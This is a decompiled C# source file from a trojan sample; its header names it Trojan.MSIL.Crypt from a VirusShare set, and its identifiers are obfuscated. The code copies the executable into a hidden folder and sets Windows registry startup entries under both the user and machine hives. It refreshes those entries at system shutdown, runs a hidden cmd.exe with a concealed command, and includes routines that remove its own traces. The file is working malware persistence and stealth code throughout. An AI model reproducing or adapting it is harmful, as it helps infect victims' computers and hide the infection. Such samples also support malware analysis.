// Decompiled with JetBrains decompiler
// Type: {72cdc055-28ec-4f9d-8b62-984d485bab22}.{a34b35d4-eee1-4a75-af20-2df80ef20959}
// Assembly: Built, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5BD05E0A-35FE-496C-B5CD-CE720A39B54F
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.pfl-5d072f5224e528472e5a50d1ebed572aa86c2691d7aedaced148054ce65a49be.exe

using \u007B05f1caea\u002D76e9\u002D4664\u002Daaa3\u002Dc3a65e3228d2\u007D;
using \u007B72cdc055\u002D28ec\u002D4f9d\u002D8b62\u002D984d485bab22\u007D;
using \u007Bf78d88e7\u002D075b\u002D4573\u002D8694\u002D8d9a4066b1ab\u007D;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace \u007B72cdc055\u002D28ec\u002D4f9d\u002D8b62\u002D984d485bab22\u007D
{
  internal class \u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D
  {
    public static void \u007B6513e4d7\u002D169f\u002D44ed\u002D89e9\u002D260fe9f53142\u007D()
    {
      if (!\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B4855a100\u002D9033\u002D444a\u002Dab63\u002Dc7295c38db03\u007D)
        return;
      SystemEvents.SessionEnding += new SessionEndingEventHandler(\u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D.\u007B378f9509\u002Db52f\u002D4007\u002D8cf6\u002De278cd851107\u007D);
      new Thread((ThreadStart) (() =>
      {
        \u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D.\u007Bc1371db7\u002D8f12\u002D4311\u002D9b90\u002D567b7bb7cf46\u007D();
        \u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D.\u007Bbe8fde54\u002D6b28\u002D46b5\u002Dbf8b\u002Da1e85a1a5ac6\u007D();
        \u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D.\u007B8f569808\u002D71ee\u002D4e80\u002Dbec0\u002D252369c7993d\u007D();
        \u007B0f0e468d\u002Db418\u002D4516\u002D9123\u002D48a5744b5cea\u007D.\u007Bb69f2a28\u002Ddd44\u002D44a3\u002Da7b9\u002D04452bcbe63b\u007D();
      })).Start();
    }

    private static void \u007B378f9509\u002Db52f\u002D4007\u002D8cf6\u002De278cd851107\u007D(
      object _param0,
      SessionEndingEventArgs _param1)
    {
      if (_param1.Reason != SessionEndReasons.SystemShutdown)
        return;
      \u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D.\u007B8f569808\u002D71ee\u002D4e80\u002Dbec0\u002D252369c7993d\u007D();
    }

    private static void \u007Bc1371db7\u002D8f12\u002D4311\u002D9b90\u002D567b7bb7cf46\u007D()
    {
      if (Process.GetCurrentProcess().MainModule.FileName == Path.Combine(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D, \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D))
        return;
      try
      {
        if (!Directory.Exists(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D))
          Directory.CreateDirectory(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D);
        ((\u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D.\u007B6b170141\u002D0004\u002D4a03\u002D9309\u002Da0be60bc6ff0\u007D) (() =>
        {
          \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007B91f61d64\u002D2910\u002D41f5\u002Daf11\u002Ddf390d24e53d\u007D(Process.GetCurrentProcess().MainModule.FileName, \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D + "\\" + \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D, false);
          File.SetAttributes(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
          File.SetAttributes(Path.Combine(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D, \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
        }))();
      }
      catch
      {
      }
    }

    public static void \u007B8f569808\u002D71ee\u002D4e80\u002Dbec0\u002D252369c7993d\u007D()
    {
      try
      {
        if (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc022d15a\u002Dc072\u002D4195\u002Dba56\u002D010d0b479430\u007D)
          Registry.CurrentUser.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B61a5d4d2\u002D35b6\u002D44e6\u002D80e8\u002Dfcddd2b78a7c\u007D).SetValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bbac4790e\u002D13c6\u002D40a0\u002D9ca7\u002Db5e4643ca054\u007D, (object) (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D + "\\" + \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D + " " + (object) new Random().Next(0, 100)));
      }
      catch
      {
      }
      try
      {
        if (!\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bde8c9c89\u002D470f\u002D4527\u002D9f6e\u002D25446f8a2ef8\u007D)
          return;
        Registry.LocalMachine.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bf6d16a1e\u002Dfae0\u002D42e4\u002Dbe77\u002D1f3dcdf41bf0\u007D).SetValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc7dc315b\u002Dc7d4\u002D4683\u002D9e23\u002D42d6103176b1\u007D, (object) (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D + "\\" + \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D + " " + new Random().Next(0, 100).ToString()));
      }
      catch
      {
      }
    }

    private static void \u007Bbe8fde54\u002D6b28\u002D46b5\u002Dbf8b\u002Da1e85a1a5ac6\u007D()
    {
      if (Process.GetCurrentProcess().MainModule.FileName == Path.Combine(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D, \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D))
        return;
      Process process = new Process();
      try
      {
        process.StartInfo = new ProcessStartInfo("cmd.exe")
        {
          UseShellExecute = false,
          RedirectStandardInput = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        StreamWriter standardInput = process.StandardInput;
        standardInput.WriteLine("cd " + \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D);
        standardInput.WriteLine(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B47d70060\u002Dfb66\u002D46cd\u002D9538\u002D4fd7c1eabf7e\u007D);
        standardInput.Close();
      }
      catch
      {
      }
      process.Kill();
    }

    public static void \u007B962040ba\u002Db30f\u002D4194\u002D94f1\u002D0b24b07024d3\u007D()
    {
      try
      {
        Registry.CurrentUser.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bf6d16a1e\u002Dfae0\u002D42e4\u002Dbe77\u002D1f3dcdf41bf0\u007D).DeleteValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bbac4790e\u002D13c6\u002D40a0\u002D9ca7\u002Db5e4643ca054\u007D);
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bf6d16a1e\u002Dfae0\u002D42e4\u002Dbe77\u002D1f3dcdf41bf0\u007D).DeleteValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc7dc315b\u002Dc7d4\u002D4683\u002D9e23\u002D42d6103176b1\u007D);
      }
      catch
      {
      }
      try
      {
        switch (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B0f79670a\u002D586f\u002D4aa9\u002D881e\u002D2fa5920d268b\u007D)
        {
          case RegistryHive.CurrentUser:
            Registry.CurrentUser.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).DeleteValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D);
            break;
          case RegistryHive.LocalMachine:
            Registry.LocalMachine.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).DeleteValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D);
            break;
        }
      }
      catch
      {
      }
      \u007Ba34b35d4\u002Deee1\u002D4a75\u002Daf20\u002D2df80ef20959\u007D.\u007B07145dec\u002Dd5f6\u002D4931\u002Da114\u002D5910115384ed\u007D();
    }

    public static void \u007B07145dec\u002Dd5f6\u002D4931\u002Da114\u002D5910115384ed\u007D()
    {
      string tempFileName = Path.GetTempFileName();
      string fileName = Process.GetCurrentProcess().MainModule.FileName;
      \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007Bc1b3cf3c\u002Df33e\u002D4d9e\u002Da484\u002Db774622d1976\u007D(tempFileName);
      \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007B3ec9117d\u002D2d87\u002D4140\u002D9603\u002Dcb4f3d6c52ce\u007D(fileName, tempFileName, \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007B253dfaad\u002D0265\u002D4ecc\u002Dbd36\u002D19fbd0bbdda1\u007D.\u007B11da0aad\u002D4ac4\u002D4f0a\u002D9140\u002D2a3215c11067\u007D);
      \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007B3ec9117d\u002D2d87\u002D4140\u002D9603\u002Dcb4f3d6c52ce\u007D(tempFileName, (string) null, \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007B253dfaad\u002D0265\u002D4ecc\u002Dbd36\u002D19fbd0bbdda1\u007D.\u007Be573d29a\u002D8eb1\u002D42b7\u002D9742\u002D436df92b4a24\u007D);
      try
      {
        if (!(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D != Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)) || !Directory.Exists(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D))
          return;
        \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007Bc1b3cf3c\u002Df33e\u002D4d9e\u002Da484\u002Db774622d1976\u007D(Path.Combine(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D, \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D));
        \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007B80e858cc\u002D93fd\u002D4d6b\u002Da5f1\u002D28ddf8b0815f\u007D(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D);
      }
      catch
      {
      }
    }

    private delegate void \u007B6b170141\u002D0004\u002D4a03\u002D9309\u002Da0be60bc6ff0\u007D();
  }
}
